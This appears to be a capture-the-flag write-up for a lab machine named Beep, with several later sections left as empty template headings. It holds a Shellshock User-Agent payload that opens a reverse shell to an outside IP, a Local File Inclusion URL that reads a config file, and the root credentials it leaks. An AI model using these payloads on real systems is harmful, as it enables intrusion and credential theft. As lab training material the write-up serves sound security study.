
## Information

| Property     | Value                       |
|--------------|-----------------------------|
| **Name**     |   |
| **IP Address**|        |
| **OS**       |         |
| **Difficulty**|    |

## Enumeration
### Nmap Scan
```bash
nmap -sC -sV -oN nmap_scan.txt -Pn 
```

```
PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAI04jN+Sn7/9f2k+5UteAWn8KKj3FRGuF4LyeDmo/xxuHgSsdCjYuWtNS8m7stqgNH5edUu8vZ0pzF/quX5kphWg/UOz9weGeGyzde5lfb8epRlTQ2kfbP00l+kq9ztuWaXOsZQGcSR9iKE4lLRJhRCLYPaEbuxKnYz4WhAv4yD5AAAAFQDXgQ9BbvoxeDahe/ksAac2ECqflwAAAIEAiGdIue6mgTfdz/HikSp8DB6SkVh4xjpTTZE8L/HOVpTUYtFYKYj9eG0W1WYo+lGg6SveATlp3EE/7Y6BqdtJNm0RfR8kihoqSL0VzKT7myerJWmP2EavMRPjkbXw32fVBdCGjBqMgDl/QSEn2NNDu8OAyQUVBEHrE4xPGI825qgAAACANnqx2XdVmY8agjD7eFLmS+EovCIRz2+iE+5chaljGD/27OgpGcjdZNN+xm85PPFjUKJQuWmwMVTQRdza6TSp9vvQAgFh3bUtTV3dzDCuoR1D2Ybj9p/bMPnyw62jgBPxj5lVd27LTBi8IAH2fZnct7794Y3Ge+5r4Pm8Qbrpy68=
|   2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA4SXumrUtyO/pcRLwmvnF25NG/ozHsxSVNRmTwEf7AYubgpAo4aUuvhZXg5iymwTcZd6vm46Y+TX39NQV/yT6ilAEtLbrj1PLjJl+UTS8HDIKl6QgIb1b3vuEjbVjDj1LTq0Puzx52Es0/86WJNRVwh4c9vN8MtYteMb/dE2Azk0SQMtpBP+4Lul4kQrNwl/qjg+lQ7XE+NU7Va22dpEjLv/TjHAKImQu2EqPsC99sePp8PP5LdNbda6KHsSrZXnK9hqpxnwattPHT19D94NHVmMHfea9gXN3NCI3NVfDHQsxhqVtR/LiZzpbKHldFU0lfZYH1aTdBfxvMLrVhasZcw==
25/tcp    open  smtp       syn-ack Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       syn-ack Apache httpd 2.2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://beep.htb/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3       syn-ack Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: EXPIRE(NEVER) PIPELINING UIDL APOP LOGIN-DELAY(0) IMPLEMENTATION(Cyrus POP3 server v2) TOP RESP-CODES USER AUTH-RESP-CODE STLS
111/tcp   open  rpcbind    syn-ack 2 (RPC #100000)
143/tcp   open  imap       syn-ack Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: ID MULTIAPPEND CATENATE STARTTLS Completed URLAUTHA0001 RENAME LISTEXT IMAP4rev1 THREAD=REFERENCES X-NETSCAPE THREAD=ORDEREDSUBJECT IDLE CONDSTORE LITERAL+ RIGHTS=kxte MAILBOX-REFERRALS ANNOTATEMORE ACL LIST-SUBSCRIBED SORT NO UIDPLUS NAMESPACE SORT=MODSEQ QUOTA BINARY IMAP4 CHILDREN UNSELECT ATOMIC OK
443/tcp   open  ssl/https? syn-ack
|_ssl-date: 2023-11-16T20:22:33+00:00; +5s from scanner time.
993/tcp   open  ssl/imap   syn-ack Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       syn-ack Cyrus pop3d
3306/tcp  open  mysql      syn-ack MySQL (unauthorized)
4445/tcp  open  upnotifyp? syn-ack
10000/tcp open  http       syn-ack MiniServ 1.570 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

```

## Initial Access
### Port [10000] - [WebMin ShellShock]

/session_login.cgi is vulnerable to shellshock vulnerability:
```http
User-Agent: () { :; }; echo; /bin/sh -i >& /dev/tcp/10.10.14.5/1337 0>&1
```

Shell received as root: 
```bash
[11:09:08] Welcome to pwncat 🐈!                                               __main__.py:164
[11:10:29] received connection from 10.10.10.7:48325                                bind.py:84
[11:10:31] 0.0.0.0:1337: normalizing shell path                                 manager.py:957
[11:10:32] 10.10.10.7:48325: registered new host w/ db                          manager.py:957
(local) pwncat$ back
(remote) root@beep:/usr/libexec/webmin# id
uid=0(root) gid=0(root)
(remote) root@beep:/usr/libexec/webmin# 
```

### Port [80] - [Elastix LFI]

Using Searchsploit to search for elastix vulnerabilties reveals an LFI vulnerability that could be triggered by requesting the following url: 
```http
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

This leads to sensitive information disclosure including the admin credentials: 

```
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
```

Extracted Password can be used to login the webmin panel with user root and password jEhdIekWmdjE.

### Port [22] - [Root SSH Access]

Extracted Password can be used to ssh connect user root and password jEhdIekWmdjE.




### User Access



#### User Flag


## Privilege Escalation


#### Root Flag


## Conclusion


## Additional Notes


## Resources
